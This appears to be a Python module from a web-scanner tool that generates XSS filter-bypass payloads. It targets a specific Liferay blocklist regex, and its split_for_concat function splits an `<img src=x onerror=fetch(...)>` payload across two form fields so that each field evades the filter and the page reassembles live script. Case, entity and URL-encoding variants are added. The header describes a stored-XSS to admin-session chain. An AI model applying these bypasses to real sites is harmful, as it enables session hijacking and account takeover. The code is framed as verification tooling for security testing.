"""Input-filter bypass mutations for injection payloads.

Why this exists — a real bug the surface scanner missed
-------------------------------------------------------
A surface XSS check fires one canonical payload (`<script>alert(1)</script>` or a
`"><svg onload=..>` canary) and concludes "filtered / not vulnerable" when it does
not reflect verbatim. That is exactly how the tool missed a confirmed stored-XSS →
admin-session chain:

the target applies a shared blocklist regex, ``com.liferay.util.Xss.regexp.pattern``
= ``.*<.*(;|=).*?`` — it only flags a value that contains a ``<`` **and** a ``=``
or ``;`` in the *same* field, and it is evaluated **per field**. So a payload
split across two fields — the ``<`` in one (no ``=``/``;``) and the ``=``/event
handler in the other (no ``<``) — passes each field on its own, and the render
sink concatenates them (``firstName + " " + surname``) back into a live
``<img src=x onerror=...>``.

Two more parser-level lessons from the same bug, encoded here:
  * an **unquoted HTML attribute** ends at the first whitespace, so a handler with
    a space (``r => new Foo()``) is truncated mid-expression and never runs;
  * a ``>`` inside an unquoted attribute (e.g. an arrow ``=>``) **closes the tag**,
    so the handler is cut there too.
A payload that must survive an unescaped ``innerHTML`` sink has to be
space-free and ``>``-free in its handler.

This module turns those into reusable mutators AND verifiers: ``evades()`` proves
a fragment beats a given filter regex, and ``split_for_concat()`` computes a real
field-splitting that both evades the filter and reassembles at the sink. The point
is to *prove* a bypass, not to guess one.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Optional

# The exact the target/Liferay blocklist pattern, so the tool can test a candidate
# fragment against the real filter rather than a made-up one.
TARGET_XSS_REGEX = r".*<.*(;|=).*?"

# A canonical, INERT proof payload. The handler is a marker fetch (no alert, no
# weaponization) that a listener/log can observe; it is deliberately space-free
# and '>'-free so it survives an unquoted-attribute innerHTML sink.
def marker_img(marker_url: str) -> str:
    """`<img src=x onerror=fetch('<marker_url>')>` — the smallest thing that, if it
    executes, proves the sink runs attacker JS in the victim's session. `fetch` of
    a benign URL only; detection is out-of-band (the marker request), never a
    weaponized action."""
    return f"<img src=x onerror=fetch('{marker_url}')>"


def evades(fragment: str, filter_regex: str = TARGET_XSS_REGEX) -> bool:
    """True if `fragment` is NOT flagged by `filter_regex` (i.e. it slips through).
    This is how we verify a bypass fragment against the *actual* server filter."""
    try:
        return re.search(filter_regex, fragment) is None
    except re.error:
        return False


def is_attr_unquoted_safe(handler: str) -> bool:
    """True if `handler` can live in an UNQUOTED HTML event attribute and still run:
    no whitespace (would truncate the value) and no ``>`` (would close the tag).
    Both were live failure modes when planting `onerror=` payloads."""
    return (" " not in handler) and ("\t" not in handler) and (">" not in handler)


@dataclass
class SplitPlan:
    """A concrete field-splitting: which fragment goes in each field, the separator
    the sink will rejoin them with, and the reassembled markup that results."""
    fragments: list[str]
    separator: str
    reassembled: str
    filter_regex: str
    def all_evade(self) -> bool:
        return all(evades(f, self.filter_regex) for f in self.fragments)


def split_for_concat(markup: str, *, separator: str = " ", max_fields: int = 2,
                     filter_regex: str = TARGET_XSS_REGEX) -> Optional[SplitPlan]:
    """Split `markup` at `separator` boundaries into <= `max_fields` contiguous
    groups such that EACH group evades `filter_regex`, and rejoining the groups
    with `separator` reproduces `markup` exactly.

    Greedy: accumulate tokens into the current field while the field still evades
    the filter; the moment adding the next token would trip the filter, start a
    new field. Returns None if it cannot be done within `max_fields` (i.e. the
    filter genuinely can't be beaten by splitting on this separator).

    For `<img src=x onerror=fetch('/m')>` with separator=' ':
      field1 = "<img"                          (has '<', no '='/';'  -> evades)
      field2 = "src=x onerror=fetch('/m')>"    (has '=', no '<'      -> evades)
    """
    tokens = markup.split(separator)
    fields: list[str] = []
    cur = ""
    for tok in tokens:
        candidate = tok if not cur else cur + separator + tok
        if evades(candidate, filter_regex):
            cur = candidate
            continue
        # adding tok would trip the filter -> close the current field first
        if cur and evades(cur, filter_regex):
            fields.append(cur)
            cur = tok
            # a single token that already trips the filter on its own is unsplittable
            if not evades(cur, filter_regex):
                return None
        else:
            # even the lone token trips it, or there's nothing to flush
            return None
    if cur:
        fields.append(cur)
    if not fields or len(fields) > max_fields:
        return None
    reassembled = separator.join(fields)
    if reassembled != markup:
        return None
    plan = SplitPlan(fields, separator, reassembled, filter_regex)
    return plan if plan.all_evade() else None


# ---- classic single-field evasions (broaden a surface probe into many) --------
def case_variants(tag: str = "script") -> list[str]:
    return [f"<{tag}>", f"<{tag.upper()}>", f"<{tag.capitalize()}>",
            f"<{''.join(c.upper() if i % 2 else c for i, c in enumerate(tag))}>"]


def html_entity_variants(payload: str) -> list[str]:
    """Encoded forms that a naive `<`-blocklist misses but a browser still decodes
    in the right context."""
    return [
        payload,
        payload.replace("<", "&lt;"),          # only dangerous if the sink double-decodes
        payload.replace("<", "&#60;").replace(">", "&#62;"),
        payload.replace("<", "\\u003c"),       # JS-string context
        payload.replace("<", "%3C").replace(">", "%3E"),  # URL context
    ]


def mutations(markup: str, *, separators: tuple[str, ...] = (" ",),
              max_fields: int = 2, filter_regex: str = TARGET_XSS_REGEX) -> list[dict]:
    """All bypass candidates for `markup`, each tagged with the technique and
    whether it is verified to evade `filter_regex`. Ordered strongest-first
    (a verified field-split beats a hopeful single-field mutation)."""
    out: list[dict] = []
    for sep in separators:
        plan = split_for_concat(markup, separator=sep, max_fields=max_fields,
                                filter_regex=filter_regex)
        if plan:
            out.append({"technique": "field-split", "separator": sep,
                        "fields": plan.fragments, "reassembled": plan.reassembled,
                        "evades_filter": True,
                        "attr_safe": is_attr_unquoted_safe(markup)})
    out.append({"technique": "verbatim", "fields": [markup],
                "reassembled": markup, "evades_filter": evades(markup, filter_regex),
                "attr_safe": is_attr_unquoted_safe(markup)})
    for enc in html_entity_variants(markup)[1:]:
        out.append({"technique": "encoding", "fields": [enc], "reassembled": enc,
                    "evades_filter": evades(enc, filter_regex),
                    "attr_safe": is_attr_unquoted_safe(enc)})
    # strongest first: verified-evading field-splits, then verified encodings, then rest
    out.sort(key=lambda m: (m["technique"] != "field-split", not m["evades_filter"]))
    return out
